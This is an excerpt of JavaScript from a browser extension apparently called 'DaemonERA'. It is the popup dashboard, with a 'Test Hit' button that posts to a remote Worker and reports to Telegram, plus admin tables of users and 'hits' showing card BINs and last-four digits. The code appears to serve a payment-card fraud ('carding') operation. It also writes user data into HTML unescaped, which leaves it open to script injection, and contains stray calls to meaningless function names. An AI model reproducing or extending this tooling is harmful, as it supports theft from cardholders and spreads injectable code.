...
document.getElementById('btnRefresh').addEventListener('click', () => {
  ...
  tgRefreshStats();
  var _ub = document.getElementById('dm-users-body');
  var _hb = document.getElementById('dm-hits-body');
  if (_ub) { delete _ub.dataset.loaded; _ub.innerHTML = ''; }
  if (_hb) { delete _hb.dataset.loaded; _hb.innerHTML = ''; }
  var _at = document.querySelector('.dm-tab[data-active="1"]');
  if (_at && _at.dataset.tab === 'users') tgLoadUsers();
  if (_at && _at.dataset.tab === 'hits')  tgLoadHits();
  funcAwayRailroad();
...
// 🎯 Test Hit — calls Worker DIRECTLY from popup (no background needed)
const btnTestHit = document.getElementById('btnTestHit');
if (btnTestHit) {
  btnTestHit.addEventListener('click', async () => {
    const orig = btnTestHit.textContent;
    btnTestHit.textContent = '⏳ Sending…';
    btnTestHit.style.pointerEvents = 'none';

    try {
      // 1. Get token directly from storage
      const stored = await new Promise(r => chrome.storage.local.get('tg_token', r));
      const token = stored.tg_token;

      if (!token) {
        btnTestHit.textContent = '❌ Not logged in — OTP login first';
        btnTestHit.style.color = '#f87171';
        setTimeout(() => {
          btnTestHit.textContent = orig;
          btnTestHit.style.color = '';
          btnTestHit.style.pointerEvents = '';
        }, 3500);
        funcLittleRegion();
        return;
      }

      // 2. Call Worker /hits directly (bypass background SW)
      const res = await fetch(TG_API + '/hits', {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
      ...
      if (res.ok) {
        btnTestHit.textContent = '✅ Hit sent! Check Telegram';
        btnTestHit.style.color = '#3fb950';
        console.log('[DaemonERA] Test hit OK, total:', data.total);
      } else {
        const msg = data.error || res.status;
        btnTestHit.textContent = '❌ Error: ' + msg;
        btnTestHit.style.color = '#f87171';
        console.error('[DaemonERA] Test hit failed:', data);
      }
      ...
      btnTestHit.textContent = '❌ Network error';
      btnTestHit.style.color = '#f87171';
      console.error('[DaemonERA] Test hit exception:', e);
      setTimeout(() => {
        btnTestHit.textContent = orig;
        btnTestHit.style.color = '';
        btnTestHit.style.pointerEvents = '';
...
(function initDashboardTabs() {
  document.addEventListener('click', function(e) {
    var tab = e.target.closest && e.target.closest('.dm-tab');
    if (!tab) return;
    ...
    if (name === 'users') {
      var ub = document.getElementById('dm-users-body');
      if (ub && !ub.dataset.loaded) tgLoadUsers();
    }
    if (name === 'hits') {
      var hb = document.getElementById('dm-hits-body');
      if (hb && !hb.dataset.loaded) tgLoadHits();
    }
  });
})();

var _dmAllUsers = [];
var dmFmt = function(t) {
  return t ? new Date(t * 1000).toLocaleDateString('en-GB', {day:'2-digit',month:'short',hour:'2-digit',minute:'2-digit'}) : '—';
};
var dmSrcColor = { widget:'#2b7cff', bot:'#3fb950', extension:'#d2a8ff' };
var dmBadge = function(s) {
  s = s || '';
  var col = dmSrcColor[s] || '#8b949e';
  return '<span style="padding:1px 7px;border-radius:999px;font-size:9px;font-weight:700;background:' + col + '22;color:' + col + ';border:1px solid ' + col + '44">' + s + '</span>';
};

function tgLoadUsers() {
  var tbody = document.getElementById('dm-users-body');
  var empty = document.getElementById('dm-users-empty');
  if (!tbody) return;
  tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:16px;color:var(--muted)">Loading…</td></tr>';
  tgApiFetch('/admin/users').then(function(r) {
    return r.json().then(function(d) {
      ...
      var spoof = document.getElementById('statSpoof');
      if (spoof) spoof.textContent = _dmAllUsers.length;
    });
  }).catch(function(e) {
    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:16px;color:var(--red)">Error: ' + (e.message||e) + '</td></tr>';
  });
}
...
function dmRenderUsers(users) {
  ...
  var empty = document.getElementById('dm-users-empty');
  if (!tbody) return;
  if (!users.length) { tbody.innerHTML = ''; if (empty) empty.style.display = ''; return; }
  if (empty) empty.style.display = 'none';
  tbody.innerHTML = users.map(function(u) {
    var name = [u.first_name, u.last_name].filter(Boolean).join(' ') || '—';
    var uname = u.username ? '@' + u.username : '—';
    var hitColor = (u.hit_count > 0) ? '#3fb950' : 'var(--muted)';
    return '<tr style="border-bottom:1px solid rgba(212,175,55,.07)">' +
      '<td style="padding:7px 8px"><div style="font-size:11px;font-weight:600;color:var(--text)">' + name + '</div><div style="font-size:10px;color:var(--muted)">' + uname + '</div></td>' +
...
document.addEventListener('input', function(e) {
  if (!e.target || e.target.id !== 'dm-user-search') return;
  var q = e.target.value.toLowerCase();
  var filtered = _dmAllUsers.filter(function(u) {
    return String(u.telegram_id).includes(q) ||
...
function tgLoadHits() {
  var tbody = document.getElementById('dm-hits-body');
  var empty = document.getElementById('dm-hits-empty');
  if (!tbody) return;
  tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:16px;color:var(--muted)">Loading…</td></tr>';
  tgApiFetch('/admin/hits?limit=50').then(function(r) {
    return r.json().then(function(d) {
      if (!r.ok) {
        return tgApiFetch('/stats').then(function(sr) {
          return sr.json().then(function(sd) {
            tbody.dataset.loaded = '1';
            dmRenderHits(sd.recent || [], true);
          });
        });
      }
      tbody.dataset.loaded = '1';
      dmRenderHits(d.hits || [], false);
    });
  }).catch(function(e) {
    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;padding:16px;color:var(--red)">Error: ' + (e.message||e) + '</td></tr>';
  });
}
...
function dmRenderHits(hits, personal) {
  ...
  var empty = document.getElementById('dm-hits-empty');
  if (!tbody) return;
  if (!hits.length) { tbody.innerHTML = ''; if (empty) empty.style.display = ''; return; }
  if (empty) empty.style.display = 'none';
  tbody.innerHTML = hits.map(function(h) {
    var who = personal ? 'Me' : (h.username ? '@' + h.username : String(h.telegram_id));
    var card = h.card_bin ? '<span style="font-family:var(--mono);font-size:10px;background:rgba(8,7,16,.7);padding:1px 5px;border-radius:4px">' + h.card_bin + '…' + (h.card_last4||'????') + '</span>' : '';
    return '<tr style="border-bottom:1px solid rgba(212,175,55,.07)">' +
      '<td style="padding:7px 8px"><div style="font-size:11px;font-weight:600;color:var(--green)">' + who + '</div><div>' + card + '</div></td>' +
